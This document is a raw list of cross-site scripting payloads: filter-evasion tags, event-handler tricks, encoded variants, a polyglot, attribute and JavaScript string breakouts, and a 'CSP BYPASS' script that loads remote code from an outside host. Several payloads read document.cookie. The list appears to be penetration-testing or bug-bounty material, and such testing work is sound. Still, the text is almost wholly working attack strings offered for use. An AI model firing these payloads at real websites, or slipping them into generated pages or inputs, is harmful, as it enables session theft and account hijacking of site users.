## Xss Payload List 4


```
### Payloads

<AuDiO/**/oNLoaDStaRt='(_=/**/confirm/**/(1))'/src><!--x

<mArquee onStart=[~[onmouseleave(([[(alert(1))]]))]] ]

<img src="/" =_=" title="onerror='/**/prompt(1)'">

<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z

<a/onmousemove=alert(1)//>xss

<object allowscriptaccess=always><param name=code value=https://l0.cm/xss.swf>

<svg+onload=eval(location.hash.substr(1))>#alert(1)

<details/open/ontoggle=confirm('XSS')>

</script><svg><script>alert(1)/&apos;

<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;// 

<svg </onload ="1> (_=prompt,_(1)) "">

<svg 1=""onload=alert(1)>

<output name="jAvAsCriPt://&NewLine;\u0061ler&#116(1)" onclick="eval(name)">X</output>

<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;23&rpar;&gt;" />

<button onmousemove="javascript:alert(1)">xss

<BoDy%0AOnpaGeshoW=+window.prompt(1)

<a href=[0x0b]xss" onfocus=prompt(1) autofocus fragment="

<isindex type=image src=1 onerror=alert(1)>

<script>a=eval;b=alert;a(b(/ 1/.source));</script>'">

<!'/!"/!\'/\"/--!><Input/Type=Text AutoFocus */; OnFocus=(confirm)(1) //>

<style><img src="</style><img src=x "><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

<embed src=/x//alert(1)><base href="javascript:\

\u003csvg/onload=alert`1`\u003e

\<svg/onload=alert`1`\>

<article xmlns ="urn:img src=x onerror=xss()//" >xss

i\{\<\/\s\t\y\le\>\<\i\m\g\20\o\ne\r\r\o\r\=\'a\le\r\t\(d\oc\u\me\nt\.c\o\o\kie\)\'\s\rc\=\'eeeeeee\'\20\>{

<img / src = \ 'dfdfd \' // onerror = \ 'alert (document.cookie) \ '>

<img/src=q onerror='new Function`al\ert\`OPENBUGBOUNTY\``'>

<Html Onmouseover=(alert)(1) //

<a href="javascript&colon;alert&lpar;document&period;domain&rpar;">Click Here</a>

<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>

<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>

&#x003c;img src=1 onerror=confirm(1)&#x003e;

%26%23x003c%3Bimg%20src%3D1%20onerror%3Dalert(1)%26%23x003e%3B%0A

x%22%3E%3Cimg%20src=%22x%22%3E%3C!--%2522%2527--%253E%253CSvg%2520O%256ELoad%253Dconfirm%2528/xss/%2529%253E

<embed src=/x//alert(1)><base href="javascript:\

<x+oncut=y=prompt,y`1`>xss

<svG x=">" onload=(co\u006efirm)``>

<script/xss~~~>;alert(1);</script/X~~~>

<VideO/**/OnerroR=~alert("1")+/SrC>

<video/poster/onerror=prompt(1)>

<sVG/xss/OnLoaD+="window['confirm']+(1)">

<img x/src=x /onerror="x-\u0063onfirm(1)">

<VidEo/oNLoaDStaRt=confirm(1)+/src>

<video/src=//w3schools.com/tags/movie.mp4%0Aautoplay/onplay=(confirm(1))>

<p/%0Aonmouseover%0A=%0Aconfirm(1)>xss

<span/onmouseover=confirm(1)>xss

<iframe/name="javascript:confirm(1);"onload="while(1){eval(name);}">

<svg/onload=window.onerror=alert;throw/XSS/;//

<object data='data:text/html;base64,PFNDUklQVD5hbGVydCgnUkVOV0FYMjMnKTs8L1NDUklQVD4=' /src>

<InpuT/**/onfocus=pr\u006fmpt(1)%0Aautofocus>xss

<img src="x:alert" onerror="eval(src%2b'(1)')">

<img/src=xss%0A/**/onerror=eval('al'%2b'ert(1)')>

<img/alt=1 onerror=eval(src) src=x:alert(alt) >

<isindex/**/alt=1+src=xss:window['alert']/**/(alt)+type=image+onerror=while(true){eval(src)}>

<input type="text" name="foo" value=""autofocus/onfocus=alert(1)//">

<math href="javascript:alert(1)">CLICKME

<var onmouseover="prompt(1)">xss</var>

<h1/onmouseover='alert(1)'>xss

<object data="javascript:alert(1)">

<--'<script>window.confirm(1)</script> --!>

<div onmouseover=prompt("1")>xss

<img src=x onerror=window.open('data:text/html;base64,PFNDUklQVD5hbGVydCgnUkVOV0FYMjMnKTs8L1NDUklQVD4=');>

<plaintext/onmousemove=prompt(1)>xss

<marquee/onstart=alert(1)>xss

<embed src=javascript:alert(1)>

<select autofocus onfocus=alert(1)>

<textarea autofocus onfocus=alert(1)>

<keygen autofocus onfocus=alert(1)>

<div/onmouseover='alert(1)'>xss

<svg/onload=document.location.href='https://google.com'>

<audio src=x onerror=confirm("1")>

<iframe src="data:text/html;base64,PFNDUklQVD5hbGVydCgnUkVOV0FYMjMnKTs8L1NDUklQVD4="/>

<img%09onerror=alert(1) src=a>

<i onclick=alert(1)>Click here</i>

<img src=<b onerror=alert('xss');>

<img src="x:? title=" onerror=alert(1)//">

<img src="x:gif" onerror="eval('al'%2b'ert(/xss/)')">

<img src="x:gif" onerror="window['al\u0065rt'] (/'xss'/)"></img> 

<a onmouseover%3D"alert(1)">xss

<script/%00%00v%00%00>alert(/xss/)</script>

<svg/onload=document.location.href='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>

<script>$=1,alert($)</script>

<svg•onload=alert(1)>

<h1/onmouseover='alert(1)'>xss

<video onerror=alert(1337) </poster>

<input onfocus=alert(1337) </autofocus>


CSP BYPASS:

<script>f=document.createElement("iframe");f.id="pwn";f.src="/robots.txt";f.onload=()=>{x=document.createElement('script');x.src='//bo0om.ru/csp.js';pwn.contentWindow.document.body.appendChild(x)};document.body.appendChild(f);</script>


POLYGLOT:

javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>


HYPERLINK TAG INJECTION:

javascript:alert(1)

javascript://%250Aalert(document.location="https://google.com",document.location="https://www.facebook.com")

javascript://%250Aalert(document.cookie)

javascripT://https://google.com%0aalert(1);//https://google.com

/x:1/:///%01javascript:alert(document.cookie)/


INLINE HTML INJECTION WITHOUT TAG BREAK:

" onclick=alert(1)//">click

" autofocus onfocus=alert(1) "

" onfocus=prompt(1) autofocus fragment="

" onmouseover="confirm(1)"style="position:absolute;width:100%;height:100%;top:0;left:0;"


JAVASCRIPT INJECTION:

'?prompt`1`?'

"])},alert(1));(function xss() {//

""});});});alert(1);$('a').each(function(i){$(this).click(function(event){x({y

"}]}';alert(1);{{'

11111';\u006F\u006E\u0065rror=\u0063onfirm; throw'1

\');confirm(1);//

x");$=alert, $(1);//

'|alert(1)|'

'*prompt(1)*'

"; ||confirm('XSS') || "

"-alert(1)-"

\'-alert(1)};{//

"'-alert(1)-'"

\u0027-confirm`1`-\u0027 

'}};alert(1);{{'

```

